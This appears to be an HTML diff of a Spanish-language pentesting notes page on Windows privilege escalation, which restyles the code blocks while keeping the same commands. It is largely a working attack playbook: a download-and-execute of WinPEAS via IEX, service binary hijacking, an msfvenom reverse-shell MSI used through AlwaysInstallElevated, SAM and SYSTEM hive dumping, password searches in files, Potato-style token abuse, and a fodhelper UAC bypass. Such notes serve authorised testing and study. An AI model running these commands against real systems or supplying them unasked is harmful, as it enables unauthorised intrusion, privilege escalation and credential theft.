@@ -562,102 +562,119 @@
 <h1 id="windows-privilege-escalation">Windows Privilege Escalation</h1>
 <h2 id="enumeracion-inicial">Enumeración Inicial</h2>
 <h3 id="sistema">Sistema</h3>
-<pre><code class="language-powershell"># Info del sistema
-systeminfo
-hostname
-whoami /all
-
-# Usuarios y grupos
-net user
-net localgroup Administrators
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c"># Info del sistema</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="n">systeminfo</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="n">hostname</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="n">whoami</span> <span class="p">/</span><span class="n">all</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="c"># Usuarios y grupos</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="n">net</span> <span class="n">user</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="n">net</span> <span class="n">localgroup</span> <span class="n">Administrators</span>
+</span></code></pre></div>
 <h3 id="herramientas-automaticas">Herramientas Automáticas</h3>
-<p>=== "WinPEAS"
-    <code>powershell
-    # Descargar y ejecutar
-    IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')</code></p>
-<p>=== "PowerUp"
-    <code>powershell
-    Import-Module .\PowerUp.ps1
-    Invoke-AllChecks</code></p>
+<div class="tabbed-set tabbed-alternate" data-tabs="1:2"><input checked="checked" id="__tabbed_1_1" name="__tabbed_1" type="radio" /><input id="__tabbed_1_2" name="__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="__tabbed_1_1">WinPEAS</label><label for="__tabbed_1_2">PowerUp</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c"># Descargar y ejecutar</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="n">IEX</span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">downloadString</span><span class="p">(</span><span class="s1">&#39;https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1&#39;</span><span class="p">)</span>
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerUp</span><span class="p">.</span><span class="n">ps1</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="nb">Invoke-AllChecks</span>
+</span></code></pre></div>
+</div>
+</div>
+</div>
 <h2 id="vectores-de-escalada">Vectores de Escalada</h2>
 <h3 id="servicios">Servicios</h3>
-<pre><code class="language-powershell"># Listar servicios
-Get-Service
-sc query state= all
-
-# Permisos de servicios
-accesschk.exe /accepteula -uwcqv &quot;Users&quot; *
-
-# Modificar binario de servicio
-sc config [service] binpath= &quot;C:\path\to\payload.exe&quot;
-sc stop [service]
-sc start [service]
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c"># Listar servicios</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="nb">Get-Service</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="nb">sc </span><span class="n">query</span> <span class="n">state</span><span class="p">=</span> <span class="n">all</span>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="c"># Permisos de servicios</span>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="n">accesschk</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">accepteula</span> <span class="n">-uwcqv</span> <span class="s2">&quot;Users&quot;</span> <span class="p">*</span>
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="c"># Modificar binario de servicio</span>
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a><span class="nb">sc </span><span class="n">config</span> <span class="no">[service]</span> <span class="n">binpath</span><span class="p">=</span> <span class="s2">&quot;C:\path\to\payload.exe&quot;</span>
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="nb">sc </span><span class="n">stop</span> <span class="no">[service]</span>
+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a><span class="nb">sc start </span><span class="no">[service]</span>
+</span></code></pre></div>
 <h3 id="unquoted-service-path">Unquoted Service Path</h3>
-<pre><code class="language-powershell"># Buscar rutas sin comillas
-wmic service get name,displayname,pathname,startmode | findstr /i &quot;auto&quot; | findstr /i /v &quot;c:\windows&quot;
-</code></pre>
-<p>!!! example "Explotación"
-    Si el path es <code>C:\Program Files\Service Folder\binary.exe</code></p>
-<pre><code>Colocar payload en `C:\Program.exe` o `C:\Program Files\Service.exe`
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c"># Buscar rutas sin comillas</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="n">wmic</span> <span class="n">service</span> <span class="n">get</span> <span class="n">name</span><span class="p">,</span><span class="n">displayname</span><span class="p">,</span><span class="n">pathname</span><span class="p">,</span><span class="n">startmode</span> <span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="s2">&quot;auto&quot;</span> <span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="p">/</span><span class="n">v</span> <span class="s2">&quot;c:\windows&quot;</span>
+</span></code></pre></div>
+<div class="admonition example">
+<p class="admonition-title">Explotación</p>
+<p>Si el path es <code>C:\Program Files\Service Folder\binary.exe</code></p>
+<p>Colocar payload en <code>C:\Program.exe</code> o <code>C:\Program Files\Service.exe</code></p>
+</div>
 <h3 id="alwaysinstallelevated">AlwaysInstallElevated</h3>
-<pre><code class="language-powershell"># Verificar
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-
-# Explotar con msfvenom
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f msi -o shell.msi
-msiexec /quiet /qn /i shell.msi
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c"># Verificar</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="n">reg</span> <span class="n">query</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SOFTWARE</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Installer</span> <span class="p">/</span><span class="n">v</span> <span class="n">AlwaysInstallElevated</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="n">reg</span> <span class="n">query</span> <span class="n">HKCU</span><span class="p">\</span><span class="n">SOFTWARE</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Installer</span> <span class="p">/</span><span class="n">v</span> <span class="n">AlwaysInstallElevated</span>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="c"># Explotar con msfvenom</span>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">windows</span><span class="p">/</span><span class="n">x64</span><span class="p">/</span><span class="n">shell_reverse_tcp</span> <span class="n">LHOST</span><span class="p">=</span><span class="n">IP</span> <span class="n">LPORT</span><span class="p">=</span><span class="n">443</span> <span class="o">-f</span> <span class="n">msi</span> <span class="n">-o</span> <span class="n">shell</span><span class="p">.</span><span class="n">msi</span>
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="n">msiexec</span> <span class="p">/</span><span class="n">quiet</span> <span class="p">/</span><span class="n">qn</span> <span class="p">/</span><span class="n">i</span> <span class="n">shell</span><span class="p">.</span><span class="n">msi</span>
+</span></code></pre></div>
 <h3 id="credenciales-guardadas">Credenciales Guardadas</h3>
-<pre><code class="language-powershell"># Credenciales en registro
-reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;
-
-# Archivos de configuración
-findstr /si password *.txt *.ini *.config
-
-# SAM y SYSTEM (si son accesibles)
-reg save HKLM\SAM sam.save
-reg save HKLM\SYSTEM system.save
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c"># Credenciales en registro</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="n">reg</span> <span class="n">query</span> <span class="s2">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="c"># Archivos de configuración</span>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="n">findstr</span> <span class="p">/</span><span class="nb">si </span><span class="n">password</span> <span class="p">*.</span><span class="n">txt</span> <span class="p">*.</span><span class="n">ini</span> <span class="p">*.</span><span class="n">config</span>
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="c"># SAM y SYSTEM (si son accesibles)</span>
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="n">reg</span> <span class="n">save</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SAM</span> <span class="n">sam</span><span class="p">.</span><span class="n">save</span>
+</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a><span class="n">reg</span> <span class="n">save</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SYSTEM</span> <span class="n">system</span><span class="p">.</span><span class="n">save</span>
+</span></code></pre></div>
 <h3 id="token-impersonation">Token Impersonation</h3>
-<pre><code class="language-powershell"># Verificar privilegios
-whoami /priv
-</code></pre>
-<p>!!! warning "Privilegios explotables"
-    - <code>SeImpersonatePrivilege</code> → Potato attacks
-    - <code>SeAssignPrimaryToken</code> → Token manipulation
-    - <code>SeBackupPrivilege</code> → Read any file
-    - <code>SeRestorePrivilege</code> → Write any file</p>
-<p>=== "PrintSpoofer"
-    <code>powershell
-    PrintSpoofer.exe -i -c cmd</code></p>
-<p>=== "GodPotato"
-    <code>powershell
-    GodPotato.exe -cmd "cmd /c whoami"</code></p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c"># Verificar privilegios</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="n">whoami</span> <span class="p">/</span><span class="n">priv</span>
+</span></code></pre></div>
+<div class="admonition warning">
+<p class="admonition-title">Privilegios explotables</p>
+<ul>
+<li><code>SeImpersonatePrivilege</code> → Potato attacks</li>
+<li><code>SeAssignPrimaryToken</code> → Token manipulation</li>
+<li><code>SeBackupPrivilege</code> → Read any file</li>
+<li><code>SeRestorePrivilege</code> → Write any file</li>
+</ul>
+</div>
+<div class="tabbed-set tabbed-alternate" data-tabs="2:2"><input checked="checked" id="__tabbed_2_1" name="__tabbed_2" type="radio" /><input id="__tabbed_2_2" name="__tabbed_2" type="radio" /><div class="tabbed-labels"><label for="__tabbed_2_1">PrintSpoofer</label><label for="__tabbed_2_2">GodPotato</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="n">PrintSpoofer</span><span class="p">.</span><span class="n">exe</span> <span class="n">-i</span> <span class="n">-c</span> <span class="n">cmd</span>
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="n">GodPotato</span><span class="p">.</span><span class="n">exe</span> <span class="n">-cmd</span> <span class="s2">&quot;cmd /c whoami&quot;</span>
+</span></code></pre></div>
+</div>
+</div>
+</div>
 <h3 id="scheduled-tasks">Scheduled Tasks</h3>
-<pre><code class="language-powershell"># Listar tareas
-schtasks /query /fo LIST /v
-
-# Buscar scripts modificables
-icacls C:\path\to\script.bat
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c"># Listar tareas</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="n">schtasks</span> <span class="p">/</span><span class="n">query</span> <span class="p">/</span><span class="n">fo</span> <span class="n">LIST</span> <span class="p">/</span><span class="n">v</span>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="c"># Buscar scripts modificables</span>
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="n">icacls</span> <span class="n">C</span><span class="p">:\</span><span class="n">path</span><span class="p">\</span><span class="n">to</span><span class="p">\</span><span class="n">script</span><span class="p">.</span><span class="n">bat</span>
+</span></code></pre></div>
 <h2 id="tecnicas-adicionales">Técnicas Adicionales</h2>
 <h3 id="dll-hijacking">DLL Hijacking</h3>
-<pre><code class="language-powershell"># Buscar DLLs faltantes con Process Monitor
-# Filtrar por &quot;NAME NOT FOUND&quot; y &quot;.dll&quot;
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c"># Buscar DLLs faltantes con Process Monitor</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="c"># Filtrar por &quot;NAME NOT FOUND&quot; y &quot;.dll&quot;</span>
+</span></code></pre></div>
 <h3 id="uac-bypass">UAC Bypass</h3>
-<pre><code class="language-powershell"># Verificar nivel de UAC
-reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System
-
-# fodhelper bypass
-reg add HKCU\Software\Classes\ms-settings\shell\open\command /d &quot;cmd.exe&quot; /f
-reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /f
-fodhelper.exe
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="c"># Verificar nivel de UAC</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="n">reg</span> <span class="n">query</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">Software</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">CurrentVersion</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">System</span>
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="c"># fodhelper bypass</span>
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="n">reg</span> <span class="n">add</span> <span class="n">HKCU</span><span class="p">\</span><span class="n">Software</span><span class="p">\</span><span class="n">Classes</span><span class="p">\</span><span class="n">ms-settings</span><span class="p">\</span><span class="n">shell</span><span class="p">\</span><span class="n">open</span><span class="p">\</span><span class="n">command</span> <span class="p">/</span><span class="n">d</span> <span class="s2">&quot;cmd.exe&quot;</span> <span class="p">/</span><span class="n">f</span>
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="n">reg</span> <span class="n">add</span> <span class="n">HKCU</span><span class="p">\</span><span class="n">Software</span><span class="p">\</span><span class="n">Classes</span><span class="p">\</span><span class="n">ms-settings</span><span class="p">\</span><span class="n">shell</span><span class="p">\</span><span class="n">open</span><span class="p">\</span><span class="n">command</span> <span class="p">/</span><span class="n">v</span> <span class="n">DelegateExecute</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_SZ</span> <span class="p">/</span><span class="n">f</span>
+</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="n">fodhelper</span><span class="p">.</span><span class="n">exe</span>
+</span></code></pre></div>
 
 
 
